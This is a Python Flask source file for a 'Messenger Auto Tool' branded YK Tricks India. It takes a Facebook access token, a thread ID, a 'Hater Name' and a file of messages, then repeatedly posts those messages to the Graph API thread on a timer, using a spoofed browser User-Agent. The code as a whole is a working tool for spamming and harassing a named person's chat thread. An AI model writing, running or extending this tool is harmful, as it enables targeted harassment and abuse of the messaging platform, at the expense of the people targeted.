from flask import Flask, request, render_template_string, redirect, url_for
import os
import time
import threading
import requests

app = Flask(__name__)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
}

running = False


@app.route('/')
def index():
    html_code = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>YK Tricks India</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body {
                font-family: 'Poppins', sans-serif;
                background: linear-gradient(to bottom, #0f2027, #203a43, #2c5364);
                color: #fff;
                display: flex;
                align-items: center;
                justify-content: center;
                height: 100vh;
                background-size: cover;
                background-position: center;
                background-repeat: no-repeat;
            }
            .form-container {
                background-color: rgba(255, 255, 255, 0.05);
                padding: 30px;
                border-radius: 20px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 0 10px rgba(0,0,0,0.3);
            }
            h1 {
                font-weight: bold;
                color: #ff00cc;
                text-align: center;
            }
            h5 {
                color: #fff;
                text-align: center;
                margin-bottom: 25px;
            }
            input, select {
                background-color: rgba(255, 255, 255, 0.1);
                color: white;
                border: none;
                padding: 10px;
                margin-bottom: 15px;
                width: 100%;
                border-radius: 10px;
            }
            input::placeholder {
                color: #ccc;
            }
            button {
                background: linear-gradient(to right, #ff00cc, #3333ff);
                border: none;
                padding: 12px;
                width: 100%;
                border-radius: 10px;
                color: #fff;
                font-weight: bold;
            }
            .footer {
                text-align: center;
                margin-top: 15px;
                font-size: 0.8rem;
            }
            .footer a {
                color: #00f7ff;
                text-decoration: none;
            }
        </style>
    </head>
    <body>
        <div class="form-container">
            <h1>🚀 YK TRICKS INDIA</h1>
            <h5>Messenger Auto Tool 🔥</h5>
            <form action="/" method="post" enctype="multipart/form-data">
                <select name="tokenType" required>
                    <option value="single">Single Token</option>
                    <option value="multi">Multi Token</option>
                </select>
                <input type="text" name="accessToken" placeholder="EAAB..." required>
                <input type="text" name="threadId" placeholder="Enter Thread/Inbox ID" required>
                <input type="text" name="kidx" placeholder="Enter Hater Name" required>
                <label class="text-light small">Upload Message File (.txt)</label>
                <input type="file" name="txtFile" accept=".txt" required>
                <input type="number" name="time" placeholder="Delay (in seconds)" required>
                <button type="submit">💬 Start Auto Messaging</button>
            </form>
            <form action="/stop" method="post">
                <button type="submit" class="mt-2 btn btn-danger w-100">🛑 STOP</button>
            </form>
            <div class="footer mt-3">
                <p>&copy; 2024 – YK Tricks India | All Rights Reserved 🌐<br>
                Telegram: <a href="https://t.me/yktricksindia" target="_blank">@yktricksindia</a></p>
            </div>
        </div>
    </body>
    </html>
    '''
    return render_template_string(html_code)


@app.route('/', methods=['POST'])
def process_form():
    global running
    running = True

    token_type = request.form.get('tokenType')
    access_token = request.form.get('accessToken')
    thread_id = request.form.get('threadId')
    hater_name = request.form.get('kidx')
    time_interval = int(request.form.get('time'))

    txt_file = request.files['txtFile']
    messages = txt_file.read().decode().splitlines()

    folder_name = f"Convo_{thread_id}"
    os.makedirs(folder_name, exist_ok=True)

    with open(os.path.join(folder_name, "details.txt"), "w") as f:
        f.write(f"Thread ID: {thread_id}\n")
        f.write(f"Hater Name: {hater_name}\n")
        f.write(f"Speed (s): {time_interval}\n")
        f.write("\n".join(messages))

    def run_spam():
        post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'

        for message_index, message in enumerate(messages):
            global running
            if not running:
                break
            data = {'access_token': access_token, 'message': f"{hater_name} {message}"}
            response = requests.post(post_url, json=data, headers=headers)

            if response.ok:
                print(f"[SUCCESS] Sent: {message}")
            else:
                print(f"[FAILURE] Failed to send: {message}")
            time.sleep(time_interval)

    threading.Thread(target=run_spam).start()
    return redirect(url_for('index'))


@app.route('/stop', methods=['POST'])
def stop():
    global running
    running = False
    return redirect(url_for('index'))


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
